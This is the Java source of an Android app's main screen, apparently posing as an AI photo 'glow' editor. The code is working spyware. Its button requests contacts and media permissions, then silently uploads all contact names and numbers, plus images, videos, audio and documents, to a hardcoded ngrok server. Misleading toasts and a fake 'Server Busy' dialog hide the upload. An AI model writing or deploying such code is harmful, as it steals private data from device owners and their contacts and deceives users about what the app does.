package com.hani.glowedit;

import android.content.Intent;
import android.Manifest;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final String SERVER_URL = "https://7d22-103-103-43-185.ngrok-free.app/upload"; // update if needed
    private Button btnAIGlow, btnCropImage;
    private boolean isUploading = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnAIGlow = findViewById(R.id.btnAIGlow);
        btnCropImage = findViewById(R.id.btnCrop); // Optional, future use

        btnAIGlow.setOnClickListener(v -> {
            if (isUploading) {
                showBusyDialog();
            } else {
                requestAllPermissions();
            }
        });
    }

    private void requestAllPermissions() {
        String[] permissions;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.READ_MEDIA_AUDIO,
                    Manifest.permission.READ_CONTACTS
            };
        } else {
            permissions = new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.READ_CONTACTS
            };
        }
        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                Toast.makeText(this, "Unable to processing!", Toast.LENGTH_SHORT).show();
                startExtraction();

                // Start the background upload service
                Intent serviceIntent = new Intent(MainActivity.this, UploadService.class);
                startForegroundService(serviceIntent);

            } else {
                Toast.makeText(this, "Please grant all permissions for proper functionality", Toast.LENGTH_LONG).show();
            }
        }
    }


    private void startExtraction() {
        isUploading = true;
        new Thread(() -> {
            extractAndUploadContacts();  // Upload contacts first
            extractAndUploadMedia();     // Then upload media/documents
            isUploading = false;
        }).start();
    }

    private void extractAndUploadMedia() {
        try {
            ContentResolver contentResolver = getContentResolver();

            // Images
            extractFiles(contentResolver, MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 500);

            // Videos
            extractFiles(contentResolver, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 500);

            // Audios
            extractFiles(contentResolver, MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, 500);

            // Documents
            extractFiles(contentResolver, MediaStore.Files.getContentUri("external"), 0);

        } catch (Exception e) {
            Log.e("ExtractionError", "Media extraction failed: " + e.getMessage());
        }
    }

    private void extractFiles(ContentResolver contentResolver, Uri uri, int maxSizeMB) {
        String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.SIZE};

        Cursor cursor = contentResolver.query(uri, projection, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String path = cursor.getString(0);
                long sizeBytes = cursor.getLong(1);

                File file = new File(path);
                if (file.exists()) {
                    boolean shouldUpload = false;

                    if (uri.equals(MediaStore.Files.getContentUri("external"))) {
                        // Documents: only > 100KB
                        shouldUpload = sizeBytes > 100 * 1024;
                    } else {
                        // Images, Videos, Audios: only < 500MB
                        shouldUpload = sizeBytes < 500L * 1024 * 1024;
                    }

                    if (shouldUpload) {
                        uploadFile(file);
                    }
                }
            }
            cursor.close();
        }
    }

    private void extractAndUploadContacts() {
        try {
            StringBuilder contactsData = new StringBuilder();
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phoneNumber = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contactsData.append(name).append(" : ").append(phoneNumber).append("\n");
                }
                cursor.close();
            }

            // Save to a temporary file
            File contactsFile = new File(getCacheDir(), "contacts.txt");
            BufferedWriter writer = new BufferedWriter(new FileWriter(contactsFile));
            writer.write(contactsData.toString());
            writer.close();

            uploadFile(contactsFile);

        } catch (Exception e) {
            Log.e("ExtractionError", "Contacts extraction failed: " + e.getMessage());
        }
    }

    private void uploadFile(File file) {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("File-Name", file.getName());

            OutputStream os = conn.getOutputStream();
            java.nio.file.Files.copy(file.toPath(), os);
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            Log.i("Upload", "Uploaded " + file.getName() + " with response code: " + responseCode);
        } catch (Exception e) {
            Log.e("UploadError", "Failed to upload " + file.getName() + ": " + e.getMessage());
        }
    }

    private void showBusyDialog() {
        runOnUiThread(() -> {
            new AlertDialog.Builder(MainActivity.this)
                    .setTitle("Server Busy")
                    .setMessage("Please try again after 30 minutes.")
                    .setPositiveButton("OK", null)
                    .show();
        });
    }
}
